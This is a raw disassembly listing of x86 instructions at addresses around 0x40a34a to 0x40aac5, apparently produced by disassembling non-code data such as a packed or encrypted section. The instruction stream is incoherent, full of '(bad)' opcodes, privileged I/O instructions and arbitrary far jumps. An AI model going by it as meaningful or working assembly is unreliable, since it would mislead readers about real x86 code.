  40a34a:	sub    ebp,DWORD PTR [ebx-0x4e7160a6]
  40a350:	push   edx
  40a351:	loop   0x40a327
  40a353:	sub    BYTE PTR [edx+edx*1+0x33d65267],0xf0
  40a35b:	imul   ecx,DWORD PTR [edx],0xf833a8a2
  40a361:	add    eax,0xaabb4eea
  40a366:	sti    
  40a367:	sub    esp,DWORD PTR [edx-0x27]
  40a36a:	out    dx,al
  40a36b:	or     bh,BYTE PTR [edx-0x16]
  40a36e:	mov    cl,0x5
  40a370:	mov    ah,0x43
  40a372:	lods   eax,DWORD PTR ds:[esi]
  40a373:	sub    al,0x1a
  40a375:	fisttp DWORD PTR [ecx-0x1d]
  40a378:	xor    eax,0x6405c327
  40a37d:	and    eax,0x2223538b
  40a382:	xchg   ebx,edx
  40a384:	jp     0x40a376
  40a386:	rcr    DWORD PTR [ebx+0xc7bac1b],1
  40a38c:	inc    ebx
  40a38d:	sti    
  40a38e:	aam    0x2f
  40a390:	push   0x5f
  40a392:	pop    esp
  40a393:	movhps QWORD PTR [edx-0x35c69874],xmm4
  40a39a:	test   al,0xcb
  40a39c:	and    cl,0x83
  40a39f:	xor    eax,0x5b40c79e
  40a3a4:	shl    DWORD PTR ds:0xe9f85c18,cl
  40a3aa:	dec    edx
  40a3ab:	dec    esi
  40a3ac:	not    DWORD PTR [ebx+0x67]
  40a3af:	int    0x47
  40a3b1:	inc    eax
  40a3b2:	and    ch,bh
  40a3b4:	lods   eax,DWORD PTR es:[esi]
  40a3b6:	fwait
  40a3b7:	or     al,0xfc
  40a3b9:	aas    
  40a3ba:	loopne 0x40a3c3
  40a3bc:	lock sbb ecx,ecx
  40a3bf:	in     eax,0xa
  40a3c1:	mov    ah,0x19
  40a3c3:	inc    bl
  40a3c5:	inc    eax
  40a3c6:	cdq    
  40a3c7:	retf   0xfa82
  40a3ca:	outs   dx,BYTE PTR ds:[esi]
  40a3cb:	sbb    al,0x67
  40a3cd:	lods   al,BYTE PTR ds:[esi]
  40a3ce:	dec    eax
  40a3cf:	jp     0x40a42a
  40a3d1:	cli    
  40a3d2:	jl     0x40a405
  40a3d4:	test   BYTE PTR [edi+0x51],ch
  40a3d7:	icebp  
  40a3d8:	xor    al,0xe1
  40a3da:	int3   
  40a3db:	lock dec ebp
  40a3dd:	dec    esp
  40a3de:	sub    esp,edi
  40a3e0:	hlt    
  40a3e1:	mov    edi,0x7bc1e98
  40a3e6:	hlt    
  40a3e7:	in     eax,dx
  40a3e8:	frstor [ebx+ebp*1]
  40a3eb:	jp     0x40a3a9
  40a3ed:	addr16 inc eax
  40a3ef:	fstp   DWORD PTR [ebx-0x29]
  40a3f2:	fst    QWORD PTR [edx+0x3d1de02a]
  40a3f8:	pop    ebx
  40a3f9:	frstor [ebx+0x7a982f43]
  40a3ff:	loop   0x40a38a
  40a401:	repz or ecx,ebx
  40a404:	pop    esi
  40a405:	ss es adc ebx,ecx
  40a409:	sub    al,0x7d
  40a40b:	mov    eax,0xf5b40cf5
  40a410:	mov    al,0x1c
  40a412:	in     eax,dx
  40a413:	mov    dl,0xe7
  40a415:	push   edi
  40a416:	jnp    0x40a467
  40a418:	test   DWORD PTR [ebp-0x22],edi
  40a41b:	aaa    
  40a41c:	cld    
  40a41d:	xor    BYTE PTR [ebp+ebx*4+0x4b],al
  40a421:	add    esi,ebx
  40a423:	push   ebp
  40a424:	(bad)  
  40a426:	xchg   ebx,eax
  40a427:	xor    BYTE PTR [edx+0x63b4d620],ah
  40a42d:	lahf   
  40a42e:	push   cs
  40a42f:	inc    edx
  40a430:	int    0xea
  40a432:	adc    dl,bh
  40a434:	jae    0x40a419
  40a436:	outs   dx,BYTE PTR ds:[esi]
  40a437:	lods   eax,DWORD PTR ds:[esi]
  40a438:	mov    ecx,DWORD PTR [esi-0x69]
  40a43b:	pop    ecx
  40a43c:	inc    ebp
  40a43d:	dec    ecx
  40a43e:	push   0x2405df12
  40a443:	jo     0x40a3f9
  40a445:	push   ebp
  40a446:	(bad)
  40a449:	call   DWORD PTR [ebx-0x67]
  40a44c:	call   0xc36d:0x2c9c7326
  40a453:	jne    0x40a4a8
  40a455:	xchg   ecx,eax
  40a456:	xor    esp,DWORD PTR ds:0x31ef9461
  40a45c:	int3   
  40a45d:	jp     0x40a489
  40a45f:	pop    eax
  40a461:	pusha  
  40a462:	lods   eax,DWORD PTR ds:[esi]
  40a463:	adc    al,0xe8
  40a465:	mov    edx,0x9c0c5d6c
  40a46a:	push   edi
  40a46b:	jae    0x40a418
  40a46d:	outs   dx,BYTE PTR ds:[esi]
  40a46e:	pushf  
  40a46f:	pop    esi
  40a470:	(bad)  
  40a471:	push   eax
  40a472:	sbb    ebp,DWORD PTR [ecx-0x4]
  40a475:	add    eax,0x51c2ac8
  40a47a:	dec    esi
  40a47b:	icebp  
  40a47c:	xchg   bh,dl
  40a47e:	mov    eax,0xa0b78d55
  40a483:	(bad)  
  40a484:	mov    dl,0x90
  40a486:	retf   0x7eb
  40a489:	xchg   edx,eax
  40a48a:	test   al,0x24
  40a48c:	call   0xcf70b290
  40a491:	dec    edx
  40a492:	mov    al,0x95
  40a494:	mov    bh,BYTE PTR [edi+0x55]
  40a497:	and    al,0xb5
  40a499:	rol    DWORD PTR [ecx],cl
  40a49b:	enter  0xbc1f,0xce
  40a49f:	mov    dl,al
  40a4a1:	mov    dh,0x1e
  40a4a3:	push   ebp
  40a4a4:	add    dh,ah
  40a4a6:	fwait
  40a4a7:	adc    dl,BYTE PTR [ecx-0x6de2efd3]
  40a4ad:	out    dx,eax
  40a4ae:	imul   esp,DWORD PTR [eax-0x5d],0x6f5e7b44
  40a4b5:	mov    ecx,0x4ab563bf
  40a4ba:	ret    
  40a4bb:	gs and al,0x4d
  40a4be:	push   esp
  40a4bf:	aaa    
  40a4c0:	xor    esi,edx
  40a4c2:	mov    eax,ds:0xd4b4416f
  40a4c7:	jb     0x40a48d
  40a4c9:	je     0x40a4a0
  40a4cb:	push   eax
  40a4cc:	test   BYTE PTR [esi],ah
  40a4ce:	ret    0x7ae4
  40a4d1:	pop    ebx
  40a4d2:	aaa    
  40a4d3:	pop    edx
  40a4d4:	adc    al,0xad
  40a4d6:	repz push ebp
  40a4d8:	bound  ebp,QWORD PTR [edx]
  40a4da:	or     ecx,DWORD PTR [edx*1+0x607f151e]
  40a4e1:	adc    al,0xe3
  40a4e3:	popa   
  40a4e4:	js     0x40a47c
  40a4e6:	loop   0x40a48a
  40a4e8:	inc    esi
  40a4e9:	icebp  
  40a4ea:	push   ebx
  40a4eb:	xchg   ebx,eax
  40a4ec:	mov    edi,0xcb494b91
  40a4f1:	cdq    
  40a4f2:	mov    dl,0xbe
  40a4f4:	xor    BYTE PTR ds:0xe9c32a87,bl
  40a4fa:	pop    edi
  40a4fb:	mov    gs,WORD PTR ss:0x7a90969f
  40a502:	add    BYTE PTR [ebx-0xf],bl
  40a505:	inc    ecx
  40a506:	bound  eax,QWORD PTR [ecx]
  40a508:	dec    edi
  40a509:	pop    es
  40a50a:	rol    DWORD PTR [bp+di],0x44
  40a50e:	adc    DWORD PTR [ecx-0x397ddc3e],0x4b
  40a515:	xchg   BYTE PTR [ecx-0x1a],ah
  40a518:	pop    esp
  40a519:	cdq    
  40a51a:	(bad)  
  40a51b:	stos   DWORD PTR es:[edi],eax
  40a51c:	push   ebp
  40a51d:	leave  
  40a51e:	fcmovu st,st(0)
  40a520:	mov    bl,0xe2
  40a522:	jae    0x40a59b
  40a524:	xchg   esp,eax
  40a525:	imul   esi,edx,0xffffff81
  40a528:	(bad)  
  40a529:	push   edi
  40a52a:	int3   
  40a52b:	out    dx,eax
  40a52c:	out    0xa8,al
  40a52e:	dec    ebx
  40a52f:	jge    0x40a55c
  40a531:	sti    
  40a532:	hlt    
  40a533:	jno    0x40a520
  40a535:	pushf  
  40a536:	cdq    
  40a537:	hlt    
  40a538:	imul   ebx,DWORD PTR [ebx+0x504f66c6],0xe80e86fa
  40a542:	jb     0x40a4fe
  40a544:	xchg   ebx,eax
  40a545:	lahf   
  40a546:	mov    edi,0x23ae410b
  40a54b:	fcom   QWORD PTR [ecx-0x5c7df561]
  40a551:	ror    DWORD PTR [bp+di+0x7a],0xe2
  40a556:	es mov ecx,0x66cd7bd5
  40a55c:	pop    edi
  40a55d:	adc    esi,DWORD PTR [edx-0x38]
  40a560:	dec    esp
  40a561:	inc    esp
  40a562:	in     eax,dx
  40a563:	pop    ecx
  40a564:	or     DWORD PTR [ebp+edi*2-0x860aedf],0xb
  40a56c:	inc    edx
  40a56d:	push   0xc052a325
  40a572:	sbb    BYTE PTR [edx-0x6e],bl
  40a575:	xor    eax,0xe5f04421
  40a57a:	push   esi
  40a57b:	mov    al,0x70
  40a57d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a57e:	add    DWORD PTR [ecx+0xc445a53],esp
  40a584:	std    
  40a585:	mov    ecx,0x3232ca3a
  40a58a:	div    BYTE PTR ss:[edx-0x72]
  40a58e:	ins    DWORD PTR es:[edi],dx
  40a58f:	std    
  40a590:	rol    DWORD PTR [ecx-0x16],1
  40a593:	push   ebx
  40a594:	adc    BYTE PTR [ebx+0x17ede1ad],cl
  40a59a:	clc    
  40a59b:	faddp  st(5),st
  40a59d:	stos   BYTE PTR es:[edi],al
  40a59e:	loopne 0x40a58d
  40a5a0:	retf   
  40a5a1:	mov    al,0xf2
  40a5a3:	aaa    
  40a5a4:	mov    DWORD PTR ss:[edx],edi
  40a5a7:	mov    esp,0x2fed460c
  40a5ac:	ret    0xdd63
  40a5af:	mov    al,ds:0xbf8276c2
  40a5b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a5b5:	pushf  
  40a5b6:	pop    ss
  40a5b7:	(bad)  
  40a5b8:	pop    ebp
  40a5b9:	call   0x4235ef1d
  40a5be:	addr16 jmp 0x5b8333ff
  40a5c4:	fisubr WORD PTR [ebx+0x9df62d6]
  40a5ca:	jmp    0x40a5e2
  40a5cc:	xchg   ebx,eax
  40a5cd:	push   esp
  40a5ce:	pop    ecx
  40a5cf:	ss xchg edi,eax
  40a5d1:	clc    
  40a5d2:	xor    dl,bh
  40a5d4:	dec    ebx
  40a5d5:	in     al,0x98
  40a5d7:	aam    0x47
  40a5d9:	cli    
  40a5da:	and    ebp,DWORD PTR cs:[edi-0x39e107fb]
  40a5e1:	dec    eax
  40a5e2:	pop    ecx
  40a5e3:	fld    TBYTE PTR [ebp-0x4168e79e]
  40a5e9:	or     eax,0xceda02b8
  40a5ee:	jnp    0x40a5dd
  40a5f0:	div    BYTE PTR [edx+0x68]
  40a5f3:	and    DWORD PTR [esp+edi*1],esp
  40a5f6:	add    al,0x10
  40a5f8:	fcomp  DWORD PTR ds:0x37b1d803
  40a5fe:	mov    ch,0x4c
  40a600:	fwait
  40a601:	sub    esp,DWORD PTR [ebx]
  40a603:	retf   0x7e25
  40a606:	and    eax,0xd067f5e2
  40a60b:	add    DWORD PTR [ebx],ecx
  40a60d:	xor    al,0x15
  40a60f:	mov    eax,0x80354e88
  40a614:	adc    DWORD PTR [esi+0x7e],edx
  40a617:	sbb    ebx,DWORD PTR [edx+0x37]
  40a61a:	ins    BYTE PTR es:[edi],dx
  40a61b:	fwait
  40a61c:	push   0x30
  40a61e:	mov    ds:0xd3eb7274,eax
  40a623:	jb     0x40a5b0
  40a625:	cli    
  40a626:	inc    edi
  40a627:	pop    edx
  40a628:	les    esp,FWORD PTR [ebx+0x70]
  40a62b:	data16 (bad) {z}
  40a631:	sub    al,0x5c
  40a633:	pop    esi
  40a634:	and    DWORD PTR [esi-0x71],ebx
  40a637:	sbb    al,0x16
  40a639:	imul   eax,DWORD PTR [esi],0x69d8b4cd
  40a63f:	data16 sti 
  40a641:	dec    esi
  40a642:	data16 in al,0xfe
  40a645:	ja     0x40a5ea
  40a647:	out    0xe4,eax
  40a649:	xor    eax,0xe5669c27
  40a64e:	(bad)  [eax]
  40a650:	sbb    BYTE PTR [ebx+0x5ba7a348],ah
  40a656:	outs   dx,DWORD PTR ds:[esi]
  40a657:	and    eax,0x46005eec
  40a65c:	or     cl,ah
  40a65e:	mov    cl,0x54
  40a660:	in     al,dx
  40a661:	loop   0x40a646
  40a663:	sbb    al,0xc8
  40a665:	lods   al,BYTE PTR ds:[esi]
  40a666:	fwait
  40a667:	mov    DWORD PTR [esi],ebp
  40a669:	jne    0x40a6d9
  40a66b:	(bad)  
  40a66c:	mov    edx,0xa5b5ee9f
  40a671:	sub    DWORD PTR [ebp-0x25ffed71],edi
  40a677:	inc    ecx
  40a678:	loope  0x40a6ad
  40a67a:	adc    ebp,0x6d
  40a67d:	cwde   
  40a67e:	push   ecx
  40a67f:	inc    edi
  40a680:	mov    BYTE PTR [eax],ah
  40a682:	xor    BYTE PTR [ebx-0x71],cl
  40a685:	call   ebp
  40a687:	mov    DWORD PTR [edx+0x3c52c19d],esi
  40a68d:	cdq    
  40a68e:	mov    eax,0x6d0b0a9b
  40a693:	cmc    
  40a694:	(bad)  
  40a695:	mov    dl,0x30
  40a697:	out    dx,eax
  40a698:	in     al,0x2a
  40a69a:	cmp    esp,DWORD PTR [esi*1-0x734e02e1]
  40a6a1:	ret    
  40a6a2:	add    DWORD PTR ds:0xb7a52b85,ebx
  40a6a8:	in     al,dx
  40a6a9:	mov    esi,0x69fd9ab2
  40a6ae:	pop    esi
  40a6af:	push   eax
  40a6b0:	adc    ecx,DWORD PTR [ecx-0x3d9c6776]
  40a6b6:	pop    edx
  40a6b7:	inc    esi
  40a6b8:	es aaa 
  40a6ba:	jb     0x40a67a
  40a6bc:	pusha  
  40a6bd:	mov    esi,eax
  40a6bf:	or     BYTE PTR [ebx-0x5b],ch
  40a6c2:	aad    0x2f
  40a6c4:	xor    DWORD PTR [esi+0x7307892],esp
  40a6ca:	les    edx,FWORD PTR [eax+0x7f246dfb]
  40a6d0:	or     DWORD PTR [esi],ebx
  40a6d2:	push   esp
  40a6d3:	push   ss
  40a6d4:	push   edx
  40a6d5:	mov    al,0x75
  40a6d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a6d8:	outs   dx,BYTE PTR ds:[esi]
  40a6d9:	and    esp,edx
  40a6db:	xchg   DWORD PTR [esi-0xcc70ea8],ebx
  40a6e1:	xor    eax,0x632dccb7
  40a6e6:	jmp    0x7b5c:0xe5a05f0e
  40a6ed:	add    bh,BYTE PTR [edx]
  40a6ef:	fdivr  QWORD PTR [edi-0x41]
  40a6f2:	repnz add ebp,DWORD PTR [eax+0x2aae7d90]
  40a6f9:	cmp    dh,BYTE PTR [edx+0xc]
  40a6fc:	lock inc edi
  40a6fe:	or     ah,BYTE PTR ds:0xd0143c3b
  40a704:	rcl    DWORD PTR [esi],0x62
  40a707:	cmp    DWORD PTR [edi],esi
  40a709:	adc    eax,0xe45ee5a9
  40a70e:	sub    dl,BYTE PTR [ebp+edx*8+0x55c8c3ec]
  40a715:	mov    eax,ds:0x9060ce92
  40a71a:	xor    eax,0x7581189
  40a71f:	aam    0x8d
  40a721:	stos   BYTE PTR es:[edi],al
  40a722:	scas   eax,DWORD PTR es:[edi]
  40a723:	in     eax,0xc1
  40a725:	rcr    BYTE PTR [edi+0x36],0x13
  40a729:	sub    eax,0xb3eca2c1
  40a72e:	ins    BYTE PTR es:[edi],dx
  40a72f:	dec    ebp
  40a730:	mov    edx,0xb0976b0d
  40a735:	mov    bh,0xc1
  40a737:	dec    eax
  40a738:	out    0xee,al
  40a73a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a73b:	mov    ds:0xbd434b7f,eax
  40a740:	xor    dl,dh
  40a742:	hlt    
  40a743:	call   0x77198983
  40a748:	js     0x40a7ac
  40a74a:	psrlq  mm2,QWORD PTR ds:[eax-0x18d23c24]
  40a752:	sub    edi,ecx
  40a754:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a756:	scas   eax,DWORD PTR es:[edi]
  40a757:	mov    dh,BYTE PTR [edx+edi*2-0x1b]
  40a75b:	popf   
  40a75c:	(bad)  
  40a75d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a75e:	stc    
  40a75f:	lds    edi,FWORD PTR [edi]
  40a761:	data16 (bad) 
  40a763:	repnz rcr BYTE PTR [esi+0x7b12d7f6],0x7b
  40a76b:	or     al,0x80
  40a76d:	ss (bad) 
  40a76f:	jle    0x40a7c4
  40a771:	cdq    
  40a772:	in     al,0x2b
  40a774:	test   al,0xb3
  40a776:	inc    esi
  40a777:	test   ch,0xe
  40a77a:	jo     0x40a724
  40a77c:	push   ebx
  40a77d:	cmc    
  40a77e:	xchg   ecx,eax
  40a77f:	add    esp,DWORD PTR [edi+0x5b]
  40a782:	(bad)  
  40a783:	cmp    al,0xd0
  40a785:	sub    DWORD PTR [edx+0x34],esi
  40a788:	outs   dx,BYTE PTR ds:[esi]
  40a789:	(bad)  
  40a78a:	mov    ecx,0x92ee888a
  40a78f:	nop
  40a790:	repnz or DWORD PTR [esi+0x6c],ecx
  40a794:	push   ebx
  40a795:	sub    edx,DWORD PTR [edx]
  40a797:	fst    QWORD PTR [esp+edi*8]
  40a79a:	mov    esi,0x19d9d3bc
  40a79f:	mov    ds:0x86227a80,eax
  40a7a4:	mov    bl,0xab
  40a7a6:	ss aam 0xd7
  40a7a9:	add    al,0x20
  40a7ab:	sub    ebx,DWORD PTR [ebx*4+0x10f61a9b]
  40a7b2:	ins    BYTE PTR es:[edi],dx
  40a7b3:	sbb    eax,0x5a077ba3
  40a7b8:	jmp    0x40a7f0
  40a7ba:	out    dx,eax
  40a7bb:	fiadd  WORD PTR [edi]
  40a7bd:	or     eax,0x9298e0ff
  40a7c2:	push   ds
  40a7c3:	dec    esi
  40a7c4:	jmp    0x15c355cc
  40a7c9:	pop    eax
  40a7ca:	retf   
  40a7cb:	loop   0x40a82f
  40a7cd:	jne    0x40a75e
  40a7cf:	mov    bh,0x2e
  40a7d1:	xchg   ecx,eax
  40a7d2:	jmp    FWORD PTR [edi-0x4413a2a6]
  40a7d8:	pop    edi
  40a7d9:	je     0x40a7fc
  40a7db:	push   0x60875476
  40a7e0:	dec    edx
  40a7e1:	dec    ebp
  40a7e2:	push   es
  40a7e3:	cmp    DWORD PTR [ecx+eiz*2+0x7cad5252],eax
  40a7ea:	push   es
  40a7eb:	adc    al,0x9
  40a7ed:	pop    esp
  40a7ee:	dec    eax
  40a7ef:	jbe    0x40a853
  40a7f1:	retf   0xb938
  40a7f4:	bound  edx,QWORD PTR [ecx-0x46]
  40a7f7:	(bad)  [ecx+0x74]
  40a7fa:	sahf   
  40a7fb:	jge    0x40a799
  40a7fd:	adc    bh,ch
  40a7ff:	add    bh,cl
  40a801:	mov    ebx,0xc308288b
  40a806:	loope  0x40a7e3
  40a808:	mov    ebx,0xe0ceb4e5
  40a80d:	and    al,0xe2
  40a80f:	push   esi
  40a810:	fsubr  QWORD PTR [ebp+0x488897dd]
  40a816:	adc    al,0xc3
  40a818:	xlat   BYTE PTR ds:[ebx]
  40a819:	mov    eax,0xf6c9e428
  40a81e:	cmp    ch,BYTE PTR [ebp-0x765a9545]
  40a824:	adc    BYTE PTR [ebx-0x59],bl
  40a827:	xor    dh,BYTE PTR [edx+0x44dff267]
  40a82d:	mov    cl,0x2c
  40a82f:	mov    DWORD PTR [ebx],0xc476467c
  40a835:	dec    esp
  40a836:	pop    eax
  40a837:	std    
  40a838:	cmp    dh,BYTE PTR [edi+ebx*1+0x67]
  40a83c:	in     al,0x57
  40a83e:	inc    esp
  40a83f:	jmp    0x40a884
  40a841:	xchg   edi,eax
  40a842:	jp     0x40a7cc
  40a844:	bound  edx,QWORD PTR [ecx-0x50ea0703]
  40a84a:	iret   
  40a84b:	in     eax,dx
  40a84c:	adc    DWORD PTR [edx],eax
  40a84e:	rcl    DWORD PTR [edi-0x476b42db],1
  40a854:	mov    bl,BYTE PTR [edx]
  40a856:	fidiv  WORD PTR [esi+ebp*8-0x1ce4ec2a]
  40a85d:	lds    edi,FWORD PTR [eax-0x4c13b444]
  40a863:	gs js  0x40a803
  40a866:	int    0x27
  40a868:	jns    0x40a7ed
  40a86a:	imul   esp,DWORD PTR [ecx],0x157d005c
  40a870:	mov    ah,0x2a
  40a872:	jg     0x40a874
  40a874:	out    0xe2,eax
  40a876:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a877:	sub    eax,0x24a071c2
  40a87c:	dec    eax
  40a87d:	add    BYTE PTR [edi-0x12d5ed6f],cl
  40a883:	popa   
  40a884:	sub    DWORD PTR [edx],eax
  40a886:	or     ecx,edi
  40a888:	aas    
  40a889:	sub    eax,0x1f06b51a
  40a88e:	dec    esi
  40a88f:	cmp    bh,BYTE PTR ds:0x393a6fb1
  40a895:	test   al,0xf1
  40a897:	rcl    BYTE PTR ds:0x98ad21a2,0xd3
  40a89e:	loop   0x40a852
  40a8a0:	call   0xcd2:0xf501f5e
  40a8a7:	loope  0x40a8ca
  40a8a9:	outs   dx,BYTE PTR ds:[esi]
  40a8aa:	push   edi
  40a8ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a8ac:	imul   ebx,DWORD PTR [edx+edi*2+0x46],0x14
  40a8b1:	lods   eax,DWORD PTR ds:[esi]
  40a8b2:	jns    0x40a924
  40a8b4:	mov    bl,0x13
  40a8b6:	fwait
  40a8b7:	cmp    ebx,ebx
  40a8b9:	add    eax,0xbb74e4cc
  40a8be:	pop    ebp
  40a8bf:	sbb    esi,edi
  40a8c1:	adc    al,0xf7
  40a8c3:	xchg   esp,eax
  40a8c4:	lahf   
  40a8c5:	ror    DWORD PTR [ebx],0x8a
  40a8c8:	inc    ebp
  40a8c9:	dec    esp
  40a8ca:	das    
  40a8cb:	jecxz  0x40a920
  40a8cd:	lea    eax,[edi-0x7cbe534d]
  40a8d3:	add    bh,bl
  40a8d5:	mov    fs,WORD PTR [ebx]
  40a8d7:	pop    ecx
  40a8d8:	or     ch,dl
  40a8da:	and    BYTE PTR [eax],ch
  40a8dc:	or     eax,0x24386dc8
  40a8e1:	xchg   ecx,eax
  40a8e2:	mov    ecx,0xa0df1d2a
  40a8e7:	pop    ecx
  40a8e8:	mov    DWORD PTR [ebx],eax
  40a8ea:	sub    dh,BYTE PTR ss:[eax]
  40a8ed:	popa   
  40a8ee:	ds nop
  40a8f0:	inc    ebx
  40a8f1:	mov    ebx,0x9a9c0b78
  40a8f6:	mov    al,0xde
  40a8f8:	push   edi
  40a8f9:	rcr    BYTE PTR fs:[eax+0x6074da60],1
  40a900:	xor    edi,DWORD PTR [edi-0x1917e495]
  40a906:	sub    ah,BYTE PTR [ecx-0x143b4b0c]
  40a90c:	retf   
  40a90d:	pop    esp
  40a90e:	and    al,0x60
  40a910:	(bad)  
  40a911:	pop    edx
  40a912:	or     BYTE PTR [ebx+0x57299a95],cl
  40a918:	loop   0x40a98d
  40a91a:	cmp    DWORD PTR [ebx+0x15772576],esp
  40a920:	xchg   ebp,eax
  40a921:	add    BYTE PTR cs:[ecx],al
  40a924:	add    ecx,0xe6d2a117
  40a92a:	iret   
  40a92b:	dec    edx
  40a92c:	sbb    DWORD PTR [edx],edx
  40a92e:	aad    0x64
  40a930:	and    BYTE PTR [edx+eiz*1-0x71],bh
  40a934:	xor    eax,ebx
  40a936:	loop   0x40a985
  40a938:	cdq    
  40a939:	arpl   WORD PTR [ebx],bx
  40a93b:	ja     0x40a924
  40a93d:	mov    ds:0xd4e89566,eax
  40a942:	in     eax,dx
  40a943:	lods   eax,DWORD PTR ds:[esi]
  40a944:	mov    ch,0xd4
  40a946:	mov    es,WORD PTR [ebp-0x4]
  40a949:	imul   eax,DWORD PTR ds:0xeeae34ec,0xd26beda7
  40a953:	dec    ecx
  40a954:	into   
  40a955:	jp     0x40a954
  40a957:	loopne 0x40a943
  40a959:	add    eax,0x6e4d243c
  40a95e:	pop    ecx
  40a95f:	jge    0x40a9cd
  40a961:	push   ss
  40a962:	mov    edi,0xc8fe9182
  40a967:	test   BYTE PTR [ebx+eiz*8-0x71573a78],dl
  40a96e:	(bad)  
  40a96f:	fwait
  40a970:	dec    edx
  40a971:	inc    ebp
  40a972:	nop
  40a973:	sbb    esi,DWORD PTR [esi+0x4cf32ee3]
  40a979:	sbb    al,0xa3
  40a97b:	pop    ecx
  40a97c:	mov    WORD PTR [eax],?
  40a97e:	in     al,dx
  40a97f:	imul   ecx,DWORD PTR [ecx+0x3c],0x451317b8
  40a986:	mov    ch,0xfd
  40a988:	mov    ebx,0x2e8f30ad
  40a98d:	out    dx,al
  40a98e:	fcmovbe st,st(4)
  40a990:	aad    0x73
  40a992:	leave  
  40a993:	retf   0x166c
  40a996:	aam    0x3c
  40a998:	rcr    ch,1
  40a99a:	and    al,0x39
  40a99c:	retf   0xd144
  40a99f:	cmp    BYTE PTR [edi+ecx*8+0x6f],dl
  40a9a3:	aaa    
  40a9a4:	mov    edi,0x3eeadf7a
  40a9a9:	rol    ecx,1
  40a9ab:	out    dx,eax
  40a9ac:	xor    BYTE PTR [esi],bh
  40a9ae:	pushf  
  40a9af:	nop
  40a9b0:	dec    ebx
  40a9b1:	and    bh,dl
  40a9b3:	ss jmp 0x40a9ac
  40a9b6:	pusha  
  40a9b7:	xchg   ebp,eax
  40a9b8:	clc    
  40a9b9:	mov    al,ds:0x3822d9e6
  40a9be:	in     eax,dx
  40a9bf:	pop    ebp
  40a9c0:	mov    ?,WORD PTR [edi-0x25]
  40a9c3:	call   edi
  40a9c5:	mov    cl,0x6d
  40a9c7:	icebp  
  40a9c8:	retf   0x8e5c
  40a9cb:	mov    al,0x32
  40a9cd:	xor    cl,al
  40a9cf:	test   al,0x51
  40a9d1:	(bad)  
  40a9d2:	and    BYTE PTR [ebp-0x78b1d487],0xbe
  40a9d9:	sbb    al,0xe8
  40a9db:	(bad)  
  40a9dc:	stos   BYTE PTR es:[edi],al
  40a9dd:	adc    al,0x56
  40a9df:	sti    
  40a9e0:	mov    esp,0x16705a8f
  40a9e5:	dec    esi
  40a9e6:	fisub  WORD PTR [ebx-0x3f]
  40a9e9:	or     BYTE PTR [ebx-0x3b464fca],al
  40a9ef:	and    ch,BYTE PTR [ecx]
  40a9f1:	mov    dh,0xa6
  40a9f3:	imul   ebx,DWORD PTR [edx],0x24
  40a9f6:	pusha  
  40a9f7:	add    bh,BYTE PTR [eax+0x7d]
  40a9fa:	loopne 0x40a994
  40a9fc:	loop   0x40aa4d
  40a9fe:	cli    
  40a9ff:	push   ebp
  40aa00:	cli    
  40aa01:	inc    esi
  40aa02:	in     al,dx
  40aa03:	or     eax,0xb98f1dcf
  40aa08:	lahf   
  40aa09:	sub    edi,0x2675e0ea
  40aa0f:	sbb    ebp,DWORD PTR [edx+ecx*4+0x70ef4e2e]
  40aa16:	out    dx,al
  40aa17:	bound  ecx,QWORD PTR [ecx]
  40aa19:	adc    BYTE PTR [edi+0x28],ch
  40aa1c:	and    edx,ecx
  40aa1e:	inc    ecx
  40aa1f:	aam    0x12
  40aa21:	fsub   QWORD PTR [ebp+0x72]
  40aa24:	pop    edi
  40aa25:	into   
  40aa26:	les    esi,FWORD PTR [eax+0x7e3a3fba]
  40aa2c:	mov    ah,0x37
  40aa2e:	mov    dl,al
  40aa30:	shl    DWORD PTR [edx+edx*1+0x33],cl
  40aa34:	inc    esp
  40aa35:	jnp    0x40aa89
  40aa37:	cdq    
  40aa38:	inc    ebx
  40aa39:	mov    ebx,?
  40aa3b:	xor    DWORD PTR [eax-0x69],ebp
  40aa3e:	push   ecx
  40aa3f:	cmp    bl,BYTE PTR [ebx-0x45f092a2]
  40aa45:	dec    edi
  40aa46:	cwde   
  40aa47:	jge    0x40a9cd
  40aa49:	lods   eax,DWORD PTR ds:[esi]
  40aa4a:	mov    eax,0x6413e519
  40aa4f:	lahf   
  40aa50:	ins    BYTE PTR es:[edi],dx
  40aa51:	fdiv   QWORD PTR [eax+0x74275e63]
  40aa57:	pop    ds
  40aa58:	das    
  40aa59:	push   ebp
  40aa5a:	mov    dh,0xa1
  40aa5c:	jmp    0x859b660d
  40aa61:	adc    DWORD PTR [esi-0x22],eax
  40aa64:	arpl   WORD PTR [edx],dx
  40aa66:	stos   DWORD PTR es:[edi],eax
  40aa67:	and    eax,0x126d2041
  40aa6c:	aam    0x2b
  40aa6e:	mov    dl,0xe7
  40aa70:	retf   
  40aa71:	fwait
  40aa72:	out    dx,al
  40aa73:	inc    edx
  40aa74:	adc    bl,dl
  40aa76:	jno    0x40aa8d
  40aa78:	loopne 0x40aaab
  40aa7a:	in     al,0x3b
  40aa7c:	pop    esp
  40aa7d:	imul   ebp,DWORD PTR [esi-0x33],0x37468d4f
  40aa84:	es stc 
  40aa86:	arpl   WORD PTR ds:0xb810f84,di
  40aa8c:	sub    DWORD PTR [edi-0x41],0xffffff9c
  40aa90:	jecxz  0x40aacf
  40aa92:	rep outs dx,DWORD PTR ds:[esi]
  40aa94:	sbb    cl,dl
  40aa96:	je     0x40aaf5
  40aa98:	das    
  40aa99:	adc    al,0x35
  40aa9b:	jmp    0x45ac:0x421ee63
  40aaa2:	aam    0x58
  40aaa4:	push   esp
  40aaa5:	add    DWORD PTR [edi+0x35967459],0xffffff94
  40aaac:	add    al,0xd7
  40aaae:	shr    DWORD PTR [eax],cl
  40aab0:	xchg   esp,eax
  40aab1:	xor    cl,BYTE PTR [ebp-0x4a]
  40aab4:	inc    ebp
  40aab5:	mov    esp,0x9d5b19bd
  40aaba:	out    dx,al
  40aabb:	mov    dl,0xb1
  40aabd:	sub    ebx,DWORD PTR [eax+eiz*4]
  40aac0:	ficomp WORD PTR [ecx+0x6d]
  40aac3:	ret    
  40aac4:	cmc    
  40aac5:	inc    eax
